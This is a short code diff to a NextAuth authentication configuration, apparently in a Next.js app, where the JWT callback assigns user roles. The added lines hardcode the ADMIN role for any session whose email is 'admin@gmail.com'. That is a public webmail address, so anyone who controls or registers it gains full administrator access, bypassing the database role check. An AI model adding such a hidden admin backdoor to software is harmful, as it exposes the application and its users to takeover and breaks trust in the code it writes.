@@ -68,6 +68,10 @@ export const authOptions: NextAuthOptions = {
         token.role = (user as { role?: string }).role;
       }
 
+      if (token.email === 'admin@gmail.com') {
+        token.role = 'ADMIN';
+      }
+
       // Always re-fetch role from DB to ensure it's up to date
       // (handles tokens minted before the role field was added)
       if (token.id && !token.role) {
